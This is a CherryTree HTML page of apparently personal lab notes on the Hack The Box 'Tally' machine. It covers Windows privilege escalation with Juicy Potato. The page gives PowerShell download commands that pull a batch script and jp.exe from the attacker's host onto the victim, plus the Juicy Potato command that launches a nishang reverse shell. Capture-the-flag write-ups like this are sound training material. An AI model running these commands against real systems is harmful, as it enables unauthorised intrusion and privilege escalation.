@@ -1,0 +1,65 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>juicy potato</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--tally.html">tally</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--all_ports.html">all ports</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint.html">sharepoint</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx.html">viewlists.aspx</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx---Documents.html">/Documents</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx--Site_Pages.html">Site Pages</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--ftp.html">ftp</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--ftp--find_._-type_f.html">find . -type f</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--keepass.html">keepass</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--keepass--kpcli_-kdb_tim.kdbx.html">kpcli -kdb tim.kdbx</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb.html">smb</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--mounting_smb_account_share.html">mounting smb account share</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient.html">connecting to the smb share with smbclient</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Archived_(dead_end).html">zz_Archived (dead end)</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Migration-Binaries-New_Folder-tester.exe.html">zz_Migration/Binaries/New Folder/tester.exe</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell.html">sqsh interactive database shell</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_does_not_exist.html">xp_cmdshell does not exist</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--reconfigure.html">reconfigure</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_'whoami'.html">xp_cmdshell 'whoami'</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--powershell_IEX_revshell.html">powershell IEX revshell</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato.html">privesc w/ juicy potato</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato--juicy_potato.html">juicy potato</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task.html">priv esc w/ scheduled task</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--SPBestWarmUp.ps1.html">SPBestWarmUp.ps1</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--Lessons_Learned.html">Lessons Learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>juicy potato</u></b></h1><span style="color:#24ff00;">A quick rundown on</span><span style="color:#ffa500;"> juicy potato</span><span style="color:#24ff00;"> is that you need a batch script that will download a </span><span style="color:#ffa500;">nishang powershell </span><span style="color:#24ff00;">calling back to our machine on a different port number </span><img src="images/1720-1.png" alt="images/1720-1.png" /> and run it along with the juicy potato exploit itself<br /><br /><span style="color:#24ff00;">batch script calling back to our nishang rev shell is </span><span style="color:#ffa500;">shell.bat</span>, <span style="color:#24ff00;">which we can write locally</span><br /><img src="images/1720-2.png" alt="images/1720-2.png" /><br /><span style="color:#24ff00;">our juicy potato executable is</span> <span style="color:#ffa500;">jp.exe</span> <a href="https://github.com/ohpe/juicy-potato/releases">download it here</a><br /><br /><br /><br /><span style="color:#24ff00;">Next lets download </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">and a simple </span><span style="color:#ffa500;">batch script </span><span style="color:#24ff00;">file to sarah's Download directory using powershell's </span><span style="color:#ffa500;">downloadfile</span><span style="color:#24ff00;"> command</span> (make sure our http server is still up as well)<br /><br /><span style="color:#ffa500;">powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.62/shell.bat', 'C:\Users\Sarah\Downloads\shell.bat')</span><br /><img src="images/1720-3.png" alt="images/1720-3.png" /><br /><span style="color:#ffa500;">powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.62/jp.exe', 'C:\Users\Sarah\Downloads\jp.exe')</span><br /><img src="images/1720-4.png" alt="images/1720-4.png" /><br /><br /><span style="color:#24ff00;">verify our downloads were written to Sarah's Downloads directory </span><br /><img src="images/1720-5.png" alt="images/1720-5.png" /><br /><br /><span style="color:#24ff00;">now we're ready to run </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">from our victim</span><br /><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 9001</span><br /><img src="images/1720-6.png" alt="images/1720-6.png" /><br /><span style="color:#24ff00;">exploit runs fine with default </span><span style="color:#ffa500;">CLSID</span><br /><br /><br /><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br /><img src="images/1720-7.png" alt="images/1720-7.png" /><br /></div></div>
+</body></html>
